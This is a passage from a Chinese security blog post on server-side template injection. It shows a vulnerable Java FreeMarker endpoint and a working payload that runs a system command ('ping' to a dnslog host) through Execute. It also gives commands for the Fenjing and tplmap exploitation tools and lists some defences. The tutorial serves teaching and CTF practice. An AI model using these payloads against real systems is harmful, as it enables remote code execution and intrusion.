    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">createHtmlFromString</span><span class="hljs-params">(String templateContent, String data)</span> <span class="hljs-keyword">throws</span> IOException, TemplateException {
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">cfg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>();
        <span class="hljs-type">StringTemplateLoader</span> <span class="hljs-variable">stringLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringTemplateLoader</span>();
        stringLoader.putTemplate(<span class="hljs-string">"myTemplate"</span>,templateContent);
        cfg.setTemplateLoader(stringLoader);
        <span class="hljs-type">Template</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> cfg.getTemplate(<span class="hljs-string">"myTemplate"</span>,<span class="hljs-string">"utf-8"</span>);
        <span class="hljs-type">Map</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();
        root.put(<span class="hljs-string">"data"</span>,data);

        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();
        template.process(root,writer);
        <span class="hljs-keyword">return</span> writer.toString();
    }

    <span class="hljs-meta">@RequestMapping(value = "/template", method =  RequestMethod.POST)</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">template</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Map&lt;String,String&gt; templates)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">StringTemplateLoader</span> <span class="hljs-variable">stringLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringTemplateLoader</span>();
        <span class="hljs-keyword">for</span>(String templateKey : templates.keySet()){
            stringLoader.putTemplate(templateKey, templates.get(templateKey));
        }
        con.setTemplateLoader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MultiTemplateLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateLoader</span>[]{stringLoader,
            con.getTemplateLoader()}));
        <span class="hljs-keyword">return</span> <span class="hljs-string">"index"</span>;
    }
}
</code></pre>
<p>上述代码主要编译给定的模板字符串和数据，生成HTML进行输出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623195253794.png" alt="image-20230623195253794"></p>
<p>模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。</p>
<p>首先需要控制被攻击模板 /template 的内容，也就是要将本来无危害的模板文件实时更改为可攻击的模板内容。使用的payload</p>
<pre><code class="hljs plaintext">{"hello.ftl": "&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()&gt; ${ ex(\"ping ilxwh0.dnslog.cn\") }&lt;title&gt;Hello!&lt;/title&gt;&lt;link href=\"/css/main.css\" rel=\"stylesheet\"&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 class=\"hello-title\"&gt;Hello!&lt;/h2&gt;&lt;script src=\"/js/main.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;"}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623195337785.png" alt="image-20230623195337785"></p>
<p>关键代码在上图的红框中，接收用户传入的参数，使用keySet()获取key值，遍历相应的模块名字，使用StringTemplateLoader来加载模板内容，并使用putTemplate将key对应的value（也就是payload）写入templateKey中。这样就可以覆盖 hello.ftl 文件的内容，具体如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623195633635.png" alt="image-20230623195633635"></p>
<p>重新更改了加载的模板内容后，然后直接访问受影响的模板文件路径，此时恶意的模板文件内容就会被加载成功了，并执行了系统命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623195646868.png" alt="image-20230623195646868"></p>
<p>dnslog平台也受到了请求</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623195702623.png" alt="image-20230623195702623"></p>
<p><strong>后言</strong></p>
<p>由于本篇文章篇幅过长，容易脑壳疼，所以分为上下篇，上篇大概介绍了几种语言常见的几种模板注入，下篇分析几个cms的模板注入，包括海洋cms，74cms，ofcms等</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
<h2 id="十二-自动化工具">十二、自动化工具</h2>
<p><strong>1.手动安装，具体参考：</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p>
<pre><code>git clone https://github.com/Marven11/Fenjing
cd Fenjing
python -m pip install -r requirements.txt
python -m fenjing scan --url 'http://xxx/'
</code></pre>
<p>输入以上命令随后，cat /flag即可得到flag</p>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11108">https://xz.aliyun.com/t/11108</a>  --smarty模板</p>
<p><strong>2.这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利</strong></p>
<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623190746095.png" alt="image-20230623190746095"></p>
<p>一键shell真香，还支持其他模板（Smarty，Mako，Tornado，Jinja2）的注入检测</p>
<h2 id="十三-漏洞防御">十三、漏洞防御</h2>
<ol>
<li>
<p>和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制</p>
</li>
<li>
<p>减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法</p>
</li>
<li>
<p>尽可能加载静态模板文件</p>
</li>
<li>
<p>另一个选择是创建一个安全加固/沙箱环境，禁用或删除潜在的危险指令。</p>
</li>
</ol>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/08/06/qian-xi-ssti-lou-dong/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/08/06/qian-xi-ssti-lou-dong/')">浅析SSTI漏洞</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/08/06/qian-xi-ssti-lou-dong/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=浅析SSTI漏洞&amp;url=http://hybcx.xyz/2023/08/06/qian-xi-ssti-lou-dong/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/06/qian-xi-xpath-zhu-ru/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">浅析Xpath注入</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/06/newscenter/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">攻防世界-NewsCenter</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.</span> <span class="toc-text">SSTI注入姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%B8%B8%E8%A7%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">一、常见代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-eval"><span class="toc-number">1.1.1.</span> <span class="toc-text">1- eval()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E5%88%AB%E6%B3%A8%E6%84%8Fphp%E4%B8%AD%E6%98%AF%E5%B9%B2%E4%BB%80%E4%B9%88%E7%9A%84"><span class="toc-number">1.1.2.</span> <span class="toc-text">特别注意：php中@是干什么的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-assert-%E6%9C%80%E5%A5%BD%E4%B8%8D%E8%A6%81%E5%8A%A0%E4%B8%8A%E5%88%86%E5%8F%B7%E4%BD%9C%E4%B8%BA%E7%BB%93%E5%B0%BE"><span class="toc-number">1.1.3.</span> <span class="toc-text">2- assert()  --（最好不要加上分号作为结尾）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-call_user_func"><span class="toc-number">1.1.4.</span> <span class="toc-text">3- call_user_func()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-create_function"><span class="toc-number">1.1.5.</span> <span class="toc-text">4- create_function()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-array_map"><span class="toc-number">1.1.6.</span> <span class="toc-text">5- array_map()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-call_user_func_array"><span class="toc-number">1.1.7.</span> <span class="toc-text">6- call_user_func_array()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-array_filter"><span class="toc-number">1.1.8.</span> <span class="toc-text">7- array_filter()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-uasort%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.9.</span> <span class="toc-text">8- uasort()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-preg_replace"><span class="toc-number">1.1.10.</span> <span class="toc-text">9- preg_replace()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">二、常见命令执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-system"><span class="toc-number">1.2.1.</span> <span class="toc-text">1- system()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-passthru"><span class="toc-number">1.2.2.</span> <span class="toc-text">2-passthru()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-exec"><span class="toc-number">1.2.3.</span> <span class="toc-text">3- exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-pcntl_exec"><span class="toc-number">1.2.4.</span> <span class="toc-text">4- pcntl_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-shell_exec"><span class="toc-number">1.2.5.</span> <span class="toc-text">5- shell_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-popenproc_open"><span class="toc-number">1.2.6.</span> <span class="toc-text">6- popen()&#x2F;proc_open()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="toc-number">1.2.7.</span> <span class="toc-text">7- 反引号 &#96;&#96;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8A%E5%BF%85%E8%A6%81%E5%87%BD%E6%95%B0%E7%9A%84%E7%94%A8%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">三、注入流程以及必要函数的用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E5%88%9D%E8%AF%86ssti"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.1. 初识SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFssti"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">1. 什么是SSTI？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-render_template%E6%B8%B2%E6%9F%93%E5%87%BD%E6%95%B0%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">2. render_template渲染函数是什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E6%83%B3"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">3. 注入的思想</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">4. 什么是模板引擎</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%BC%95%E5%8F%91ssti%E7%9A%84%E7%9C%9F%E6%AD%A3%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">5. 引发SSTI的真正原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-route%E8%A3%85%E9%A5%B0%E5%99%A8%E8%B7%AF%E7%94%B1"><span class="toc-number">1.3.1.6.</span> <span class="toc-text">6. route装饰器路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-main%E5%85%A5%E5%8F%A3"><span class="toc-number">1.3.1.7.</span> <span class="toc-text">7. main入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93%E9%87%8D%E7%82%B9"><span class="toc-number">1.3.1.8.</span> <span class="toc-text">8. 模板渲染（重点）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E5%88%A4%E6%96%ADssti%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.2. 判断SSTI类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">1. 常见的模板引擎</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%A6%82%E4%BD%95%E6%B5%8B%E8%AF%95%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8ssti"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">2. 如何测试是否存在SSTI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">3. 靶场实战</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-ssti%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">4. SSTI利用思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-%E5%B8%B8%E7%94%A8%E7%B1%BB"><span class="toc-number">1.3.3.</span> <span class="toc-text">2.3 常用类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">魔术对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E9%AD%94%E6%9C%AF%E5%AF%B9%E8%B1%A1%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">用魔术对象构造一个简单的语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dir%E4%B8%8E__dict__"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">dir()与__dict__</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-%E5%B8%B8%E8%A7%81%E7%9A%84playload"><span class="toc-number">1.3.4.</span> <span class="toc-text">2.4 常见的playload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.5.</span> <span class="toc-text">2.5 常见的命令执行方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ossystem"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">os.system()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ospopen"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">os.popen()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#warningscatchwarning"><span class="toc-number">1.3.5.3.</span> <span class="toc-text">warnings.catchwarning</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#values"><span class="toc-number">1.3.5.4.</span> <span class="toc-text">values</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#__builtins__%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.5.5.</span> <span class="toc-text">__builtins__内建函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.5.6.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%8F%8C%E4%B8%8B%E5%88%92%E7%BA%BF__"><span class="toc-number">1.3.5.7.</span> <span class="toc-text">过滤双下划线__</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E8%8A%B1%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.3.5.8.</span> <span class="toc-text">过滤花括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="toc-number">1.3.5.9.</span> <span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%92%8C%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.3.5.10.</span> <span class="toc-text">过滤了单双引号和中括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.3.5.11.</span> <span class="toc-text">过滤关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.5.12.</span> <span class="toc-text">字符串拼接绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-_"><span class="toc-number">1.3.5.13.</span> <span class="toc-text">过滤 _</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4os"><span class="toc-number">1.3.5.14.</span> <span class="toc-text">过滤os</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4args"><span class="toc-number">1.3.5.15.</span> <span class="toc-text">过滤args</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E5%86%85%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.5.16.</span> <span class="toc-text">引号内十六进制绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#chr%E7%AD%89%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%A0%E6%B3%95%E5%BC%95%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.3.5.17.</span> <span class="toc-text">&quot; ’ chr等被过滤，无法引入字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%95%B0%E5%AD%97"><span class="toc-number">1.3.5.18.</span> <span class="toc-text">过滤数字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-jinja2-%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.5.19.</span> <span class="toc-text">使用 Jinja2 过滤器绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26-%E4%B8%80%E4%BA%9B%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.3.6.</span> <span class="toc-text">2.6 一些姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-config"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">1. config</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-self"><span class="toc-number">1.3.6.2.</span> <span class="toc-text">2. self</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%AD%89%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.6.3.</span> <span class="toc-text">3.  “” 、 [] 、 () 等数据结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-url_for-g-request-namespace-lipsum-range-session-dictget_flashed_messages-cycler-joiner-config%E7%AD%89"><span class="toc-number">1.3.6.4.</span> <span class="toc-text">4、url_for, g, request, namespace, lipsum, range, session, dict,get_flashed_messages, cycler, joiner, config等</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%9C%A8url%E6%89%A7%E8%A1%8Cpy%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.3.6.5.</span> <span class="toc-text">5. 在URL执行py命令格式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27-%E5%B8%B8%E7%94%A8%E5%88%B0%E7%9A%84payload"><span class="toc-number">1.3.7.</span> <span class="toc-text">2.7 常用到的payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ssti%E5%B8%B8%E7%94%A8%E7%9A%84%E8%AF%AD%E5%8F%A5%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">SSTI常用的语句格式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87ssti%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">绕过SSTI过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.7.3.</span> <span class="toc-text">符号的过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E7%82%B9%E5%8F%B7"><span class="toc-number">1.3.7.4.</span> <span class="toc-text">过滤了点号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span 